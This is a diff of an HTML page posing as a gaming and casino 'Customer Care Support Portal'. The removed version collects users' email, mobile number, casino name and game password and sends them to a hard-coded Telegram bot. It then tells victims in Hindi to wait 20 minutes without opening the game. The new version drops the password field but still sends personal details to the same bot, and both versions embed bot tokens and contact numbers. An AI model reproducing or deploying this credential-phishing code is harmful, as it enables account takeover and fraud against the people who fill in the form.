@@ -1,348 +1,165 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Helpcare24 Customer Care</title>
 
-<title>Customer Care Support Portal</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
 
-<style>
-*{
-    box-sizing:border-box;
-    margin:0;
-    padding:0;
-}
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f5f7fb;
+      color: #222;
+    }
 
-body{
-    font-family:Arial,sans-serif;
-    min-height:100vh;
-    padding:20px;
-    color:#fff;
-    background:linear-gradient(135deg,#0f172a,#1e1b4b,#312e81);
-}
+    .container {
+      max-width: 500px;
+      margin: 50px auto;
+      padding: 25px;
+    }
 
-.container{
-    max-width:520px;
-    margin:auto;
-}
+    .card {
+      background: white;
+      padding: 25px;
+      border-radius: 18px;
+      box-shadow: 0 8px 30px rgba(0,0,0,.08);
+    }
 
-.header{
-    text-align:center;
-    margin-bottom:20px;
-}
+    h1 {
+      margin-top: 0;
+      text-align: center;
+    }
 
-.logo{
-    width:75px;
-    height:75px;
-    margin:auto;
-    border-radius:50%;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-size:36px;
-    background:linear-gradient(135deg,#22c55e,#06b6d4);
-    box-shadow:0 0 25px rgba(34,197,94,.45);
-}
+    input, textarea {
+      width: 100%;
+      padding: 13px;
+      margin: 8px 0;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      font-size: 15px;
+    }
 
-h1{
-    margin-top:15px;
-    font-size:26px;
-}
+    textarea {
+      min-height: 110px;
+      resize: vertical;
+    }
 
-.subtitle{
-    margin-top:7px;
-    color:#cbd5e1;
-    font-size:14px;
-}
+    button {
+      width: 100%;
+      padding: 14px;
+      border: 0;
+      border-radius: 10px;
+      background: #1667e8;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
 
-.card{
-    padding:22px;
-    border-radius:20px;
-    background:rgba(15,23,42,.94);
-    border:1px solid rgba(255,255,255,.12);
-    box-shadow:0 15px 40px rgba(0,0,0,.35);
-}
+    button:disabled {
+      opacity: .6;
+    }
 
-label{
-    display:block;
-    margin:14px 0 7px;
-    font-size:14px;
-    font-weight:bold;
-}
-
-input,
-select,
-textarea{
-    width:100%;
-    padding:13px;
-    border-radius:10px;
-    border:1px solid #475569;
-    background:#0f172a;
-    color:#fff;
-    outline:none;
-    font-size:15px;
-}
-
-input:focus,
-select:focus,
-textarea:focus{
-    border-color:#22c55e;
-}
-
-textarea{
-    min-height:90px;
-    resize:vertical;
-}
-
-.note{
-    margin-top:12px;
-    padding:12px;
-    border-radius:10px;
-    background:rgba(245,158,11,.1);
-    border:1px solid rgba(245,158,11,.3);
-    color:#fde68a;
-    font-size:12px;
-    line-height:1.5;
-}
-
-.btn{
-    width:100%;
-    border:0;
-    padding:14px;
-    margin-top:18px;
-    border-radius:12px;
-    font-size:16px;
-    font-weight:bold;
-    cursor:pointer;
-    color:#fff;
-}
-
-.submit{
-    background:linear-gradient(135deg,#16a34a,#059669);
-}
-
-.whatsapp{
-    background:#25D366;
-}
-
-.telegram{
-    background:#229ED9;
-}
-
-.footer{
-    text-align:center;
-    margin-top:18px;
-    color:#94a3b8;
-    font-size:12px;
-}
-
-.modal{
-    display:none;
-    position:fixed;
-    inset:0;
-    background:rgba(0,0,0,.78);
-    align-items:center;
-    justify-content:center;
-    padding:20px;
-}
-
-.modal-box{
-    width:100%;
-    max-width:400px;
-    padding:25px;
-    border-radius:18px;
-    text-align:center;
-    background:#0f172a;
-    border:1px solid #334155;
-}
-
-.success-icon{
-    font-size:48px;
-    margin-bottom:10px;
-}
-
-.close{
-    margin-top:18px;
-    padding:11px 25px;
-    border:0;
-    border-radius:10px;
-    background:#334155;
-    color:#fff;
-    cursor:pointer;
-}
-</style>
+    #status {
+      text-align: center;
+      margin-top: 15px;
+    }
+  </style>
 </head>
 
 <body>
 
 <div class="container">
+  <div class="card">
+    <h1>Customer Care</h1>
 
-<div class="header">
-    <div class="logo">🛡️</div>
-    <h1>Customer Care Support</h1>
-    <div class="subtitle">Fast • Secure • Trusted Support Portal</div>
-</div>
+    <form id="supportForm">
 
-<div class="card">
+      <input id="name" placeholder="Name" required>
 
-<form id="supportForm">
-    <label>Registered Email</label>
-    <input type="email" id="email" placeholder="Enter your registered email" required>
+      <input id="email" type="email" placeholder="Email" required>
 
-    <label>Registered Mobile</label>
-    <input type="tel" id="mobile" placeholder="Enter your registered mobile" required>
+      <input id="mobile" placeholder="Mobile Number" required>
 
-    <label>Casino / Game Name</label>
-    <input type="text" id="casino" placeholder="Enter name" required>
+      <input id="casino" placeholder="Platform / Service">
 
-    <label>Password</label>
-    <input type="text" id="password" placeholder="Enter your game password" required>
+      <input id="userId" placeholder="User ID">
 
-    <label>Withdrawal / Deposit Amount</label>
-    <input type="number" id="amount" placeholder="Enter amount" min="0">
+      <textarea id="message" placeholder="Describe your issue" required></textarea>
 
-    <label>Issue Type</label>
-    <select id="issue" required>
-        <option value="">Select your issue</option>
-        <option>Withdrawal Processing</option>
-        <option>Withdrawal Declined</option>
-        <option>Deposit Not Received</option>
-        <option>Account Verification (KYC)</option>
-        <option>ID Blocked</option>
-        <option>Bonus Issue</option>
-        <option>Other Issue</option>
-    </select>
+      <button type="submit" id="submitBtn">
+        Submit Support Request
+      </button>
 
-    <label>Additional Details</label>
-    <textarea id="message" placeholder="Describe your issue..."></textarea>
+    </form>
 
-    <div class="note">⚠️ please share your All information.</div>
-
-    <button type="submit" class="btn submit" id="submitBtn">Submit Support Request</button>
-</form>
-
-<button class="btn whatsapp" onclick="openWhatsApp()">💬 Chat on WhatsApp</button>
-<button class="btn telegram" onclick="openTelegram()">✈️ Chat on Telegram</button>
-
-</div>
-
-<div class="footer">
-Please verify the official support channel before sharing account information.
-</div>
-
-</div>
-
-<!-- SUCCESS MODAL -->
-<div class="modal" id="successModal">
-    <div class="modal-box">
-        <div class="success-icon">✅</div>
-        <h2>Request Received!</h2>
-        <p style="margin-top:10px;color:#cbd5e1;line-height:1.6;">
-        आपकी रिक्वेस्ट एक्सपर्ट टीम तक चली गई है।
-        <br><br>
-        कृपया 20 मिनट वेट करें और तब तक गेम ओपन ना करें, ताकि टीम को इशू चेक करने का समय मिल सके।
-        </p>
-        <button class="close" onclick="closeModal()">Close</button>
-    </div>
+    <div id="status"></div>
+  </div>
 </div>
 
 <script>
-// Telegram Bot Credentials
-const BOT_TOKEN = "8635289165:AAFZwVQyRlf-3K9PNedfwaWbcOQc77Fk60E";
+const BOT_TOKEN = "8635289165:AAEzgI0Z9S8YgJXqTxssiVzZklLnje2EFwY";
 const CHAT_ID = "8882142102";
 
-const form = document.getElementById("supportForm");
-const submitBtn = document.getElementById("submitBtn");
+document.getElementById("supportForm").addEventListener("submit", async function(e) {
+  e.preventDefault();
 
-form.addEventListener("submit", async function(event){
-    event.preventDefault();
+  const button = document.getElementById("submitBtn");
+  const status = document.getElementById("status");
 
-    const data = {
-        email: document.getElementById("email").value.trim(),
-        mobile: document.getElementById("mobile").value.trim(),
-        casino: document.getElementById("casino").value.trim(),
-        password: document.getElementById("password").value.trim(),
-        amount: document.getElementById("amount").value.trim(),
-        issue: document.getElementById("issue").value,
-        message: document.getElementById("message").value.trim()
-    };
+  button.disabled = true;
+  button.textContent = "Submitting...";
+  status.textContent = "";
 
-    if(!data.email || !data.mobile || !data.casino || !data.password || !data.issue){
-        alert("Please fill all required fields.");
-        return;
+  const name = document.getElementById("name").value.trim();
+  const email = document.getElementById("email").value.trim();
+  const mobile = document.getElementById("mobile").value.trim();
+  const casino = document.getElementById("casino").value.trim() || "N/A";
+  const userId = document.getElementById("userId").value.trim() || "N/A";
+  const message = document.getElementById("message").value.trim();
+
+  const text = `📬 *New Support Request*\n\n` +
+               `👤 *Name:* ${name}\n` +
+               `📧 *Email:* ${email}\n` +
+               `📱 *Mobile:* ${mobile}\n` +
+               `🎰 *Platform/Service:* ${casino}\n` +
+               `🆔 *User ID:* ${userId}\n` +
+               `💬 *Message:* ${message}`;
+
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: "Markdown"
+      })
+    });
+
+    const result = await response.json();
+
+    if (!result.ok) {
+      throw new Error(result.description || "Request failed");
     }
 
-    submitBtn.disabled = true;
-    submitBtn.textContent = "Submitting...";
+    status.textContent = "Request submitted successfully.";
+    document.getElementById("supportForm").reset();
 
-    // Formatting message for Telegram
-    const telegramMessage = `
-🚨 <b>New Support Request</b> 🚨
+  } catch (error) {
+    status.textContent = "Unable to submit request. Please try again.";
+  }
 
-📧 <b>Email:</b> ${data.email}
-📱 <b>Mobile:</b> ${data.mobile}
-🎮 <b>Casino:</b> ${data.casino}
-🅿️ <b>Password:</b> ${data.password}
-💰 <b>Amount:</b> ${data.amount ? data.amount : 'N/A'}
-⚠️ <b>Issue:</b> ${data.issue}
-📝 <b>Message:</b> ${data.message ? data.message : 'N/A'}
-    `;
-
-    try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: telegramMessage,
-                parse_mode: "HTML"
-            })
-        });
-
-        const result = await response.json();
-
-        if(!response.ok || !result.ok){
-            throw new Error("Submission failed");
-        }
-
-        // Show Success Modal
-        document.getElementById("successModal").style.display = "flex";
-
-        // Voice Alert (Updated for proper Hindi pronunciation)
-        if("speechSynthesis" in window){
-            const speech = new SpeechSynthesisUtterance(
-                "आपकी रिक्वेस्ट एक्सपर्ट टीम तक चली गई है। कृपया 20 मिनट वेट करें और तब तक गेम ओपन ना करें।"
-            );
-            speech.lang = "hi-IN";
-            speech.rate = 0.9;
-            window.speechSynthesis.cancel();
-            window.speechSynthesis.speak(speech);
-        }
-
-        form.reset();
-
-    } catch(error) {
-        console.error(error);
-        alert("Request submit nahi ho paayi. Please thodi der baad try karein.");
-    }
-
-    submitBtn.disabled = false;
-    submitBtn.textContent = "Submit Support Request";
+  button.disabled = false;
+  button.textContent = "Submit Support Request";
 });
-
-function closeModal(){
-    document.getElementById("successModal").style.display = "none";
-}
-
-function openWhatsApp(){
-    window.open("https://wa.me/917300365084", "_blank");
-}
-
-function openTelegram(){
-    window.open("https://t.me/Helpcare02", "_blank");
-}
 </script>
 
 </body>
